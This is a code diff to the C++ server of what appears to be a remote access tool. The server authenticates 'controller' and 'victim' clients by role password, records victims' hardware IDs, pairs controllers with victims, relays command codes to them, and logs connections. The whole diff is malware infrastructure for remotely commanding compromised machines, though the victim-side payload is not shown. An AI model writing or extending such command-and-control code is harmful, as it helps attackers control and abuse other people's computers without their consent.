@@ -2,6 +2,11 @@
 
 Server::Server()
 {
+	//add new line in the log file
+	std::ofstream file(LOG_FILE, std::ios::app);
+	file << "\n";
+	file.close();
+
 	//start listening to the port. if it fails, exit
 	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
 		writeLog("listening on port " + std::to_string(SERVER_PORT) + " failed");
@@ -20,10 +25,10 @@ void Server::receive()
 	if (!selector.wait())
 		return;
 
-	//mutex used for clients write access
+	//lock mutex used for clients access
 	mutex.lock();
 
-	std::vector<sf::Uint16> idsToKill;
+	std::vector<sf::Uint16> idsToKill, idsToDisc;
 
 	//check if a client has received something
 	for (auto& c : clients) {
@@ -31,47 +36,64 @@ void Server::receive()
 		if (!selector.isReady(*c.second.socket))
 			continue;
 
+		//receive packet from client
 		sf::Packet p;
 		c.second.socket->receive(p);
 
-		//disconnect client
+		//disconnect client if packet is invalid
 		if (p.getDataSize() == 0) {
-			writeLog(std::to_string(c.first) + " disconnected");
+			if (c.second.role == '-')
+				writeLog(std::to_string(c.first) + " disconnected without initializing");
+			else
+				writeLog(std::to_string(c.first) + " disconnected");
+
 			disconnect(c.first);
 			break;
 		}
 
+		//update time last message not mark as not-afk
 		c.second.lastMsg = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
 
 		//process the packet if it was received by a controller
 		if (c.second.role == 'c')
-			processControllerMsg(c.first, p, idsToKill);
+			processControllerMsg(c.first, p, idsToKill, idsToDisc);
 		//process the packet if it was received by a victim
 		else if (c.second.role == 'v')
-			processVictimMsg(c.first, p);
+			processVictimMsg(c.first, p, idsToDisc);
 		//process the packet if it was received by an uninitialized client
 		else if (c.second.role == '-') {
 			//get the client's role and name
-			sf::Uint8 version;
-			p >> version;
-			p >> c.second.name;
-			p.clear();
+			sf::Uint8 wantedRole;
+			std::string rolePass;
+			p >> wantedRole >> rolePass;
 
-			//add new controller/victim to the list
-			if (version == CONTROLLER_VERSION || version == VICTIM_VERSION) {
-				if (version == CONTROLLER_VERSION)
-					p << sf::Uint8(CONTROLLER_VERSION) << sf::Uint16(c.first);
-				else
-					p << sf::Uint8(VICTIM_VERSION);
+			//add new controller or victim to the list
+			if (wantedRole == 'c' || wantedRole == 'v') {
+				//version mis-match
+				if (rolePass != ((wantedRole == 'c') ? CONTROLLER_PASS : VICTIM_PASS)) {
+					p.clear();
+					p << sf::Uint8('<');
+					c.second.socket->send(p);
 
+					//parse next message
+					continue;
+				}
+
+				//retrieve hardware id
+				p >> c.second.hardwareId;
+
+				p.clear();
 				//tell the client that it has been initialized
+				p << sf::Uint8(wantedRole);
+				//controllers need to know their id too
+				if (wantedRole == 'c')
+					p << sf::Uint16(c.first);
 				c.second.socket->send(p);
-				char role = (version == CONTROLLER_VERSION) ? 'c' : 'v';
-				c.second.role = role;
+				c.second.role = wantedRole;
 
 				auto ip = c.second.socket->getRemoteAddress().toString() + ":" + 
 					std::to_string(c.second.socket->getRemotePort());
-				writeLog(std::to_string(c.first) + " = new " + role + " - " + ip);
+				writeLog(std::to_string(c.first) + " = new " + std::string(1, wantedRole) + " - " + ip);
 
 				updateControllersList();
 			}
@@ -85,6 +107,11 @@ void Server::receive()
 	//cycle through ids to kill and kill them
 	for (const auto id : idsToKill) {
 		writeLog(std::to_string(id) + " killed");
+		disconnect(id);
+	}
+	//cycle through ids to disconnect and disconnect them
+	for (const auto id : idsToDisc) {
+		writeLog(std::to_string(id) + " encountered a problem");
 		disconnect(id);
 	}
 
@@ -102,6 +129,8 @@ void Server::receive()
 			currentId--;
 		}
 	}
+
+	//unlock mutex used for clients access
 	mutex.unlock();
 }
 void Server::checkAwake()
@@ -119,7 +148,11 @@ void Server::checkAwake()
 
 		//disconnect afk clients
 		for (auto id : idsToRemove) {
-			writeLog(std::to_string(id) + " timed out");
+			if (clients[id].role == '-')
+				writeLog(std::to_string(id) + " timed out without initializing");
+			else
+				writeLog(std::to_string(id) + " timed out");
+
 			disconnect(id);
 		}
 		mutex.unlock();
@@ -129,7 +162,8 @@ void Server::checkAwake()
 	}
 }
 
-void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToKill)
+void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, 
+	std::vector<sf::Uint16>& idsToKill, std::vector<sf::Uint16>& idsToDisc)
 {
 	sf::Uint8 cmd;
 	p >> cmd;
@@ -165,12 +199,14 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h' || cmd == 'b' || cmd == 'g') {
 
 		//controller is not paired
-		if (clients[id].pair == 0)
+		if (clients[id].pair == 0) {
+			idsToDisc.push_back(id);
 			return;
+		}
 
 		clients[clients[id].pair].socket->send(p);
 	}
-	//unpair controller from victim (admin checked later)
+	//unpair a client (admin checked later)
 	else if (cmd == 'u') {
 		sf::Uint16 otherId;
 		p >> otherId;
@@ -244,10 +280,6 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 			return;
 
 		clients[oId].name = name;
-		p.clear();
-		p << sf::Uint8('w') << name;
-		//send the new name to the client
-		clients[oId].socket->send(p);
 
 		updateControllersList();
 	}
@@ -268,16 +300,15 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 			clients[oId].isAdmin = true;
 
 		updateControllersList();
-		}
+	}
 	//apparently controller thinks it isn't initialized
-	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
-		//reset controller's role and name
-		clients[id].role = '-';
-		clients[id].name = "";
+	else if (cmd == 'c' || cmd == 'v') {
+		//reset connection with client
+		idsToDisc.push_back(id);
 	}
 
 }
-void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
+void Server::processVictimMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToDisc)
 {
 	sf::Uint8 cmd;
 	p >> cmd;
@@ -291,10 +322,9 @@ void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 		clients[clients[id].pair].socket->send(p);
 	}
 	//apparently victim thinks it isn't initialized
-	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
-		//reset controller's role and name
-		clients[id].role = '-';
-		clients[id].name = "";
+	else if (cmd == 'c' || cmd == 'v') {
+		//reset connection with client
+		idsToDisc.push_back(id);
 	}
 }
 
@@ -343,40 +373,33 @@ void Server::disconnect(sf::Uint16 id)
 }
 void Server::updateControllersList()
 {
-	//send a packet to all controllers
-	auto sendControllers = [this](sf::Packet p) {
-		for (auto& c : clients) {
-			if (c.second.role == 'c')
-				c.second.socket->send(p);
-		}
-	};	
+	sf::Packet p;
+	//tell the controllers how many clients are connected
+	p << sf::Uint8('d') << sf::Uint16(clients.size());
 
-	//send to controllers each client info
+	//load each client info into the packet
 	for (const auto& c : clients) {
-		//skip if client isn't initialized
 		if (c.second.role == '-')
 			continue;
 
-		//load all client info
-		sf::Packet p;
-		p << ((c.second.role == 'c') ? sf::Uint8('n') : sf::Uint8('l')) << c.first << c.second.name << c.second.time;
-		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << sf::Uint16(c.second.pair) << c.second.isAdmin;
-
-		//send client info to all controllers
-		sendControllers(p);
+		p << sf::Uint8(c.second.role) << c.first << c.second.pair << c.second.name << c.second.hardwareId;
+		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << c.second.isAdmin;
 	}
 
-	//tell controllers to display clients list
-	sf::Packet p;
-	p << sf::Uint8('d');
-	sendControllers(p);
+	//send the packet to all controllers
+	for (auto& c : clients) {
+		if (c.second.role != 'c')
+			continue;
+
+		c.second.socket->send(p);
+	}
 }
 
 void Server::writeLog(std::string s)
 {
 	auto t = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
 
-	std::ofstream file(LOG_PATH, std::ios::app);
+	std::ofstream file(LOG_FILE, std::ios::app);
 	file << t << " - " << s << "\n";
 	file.close();
 
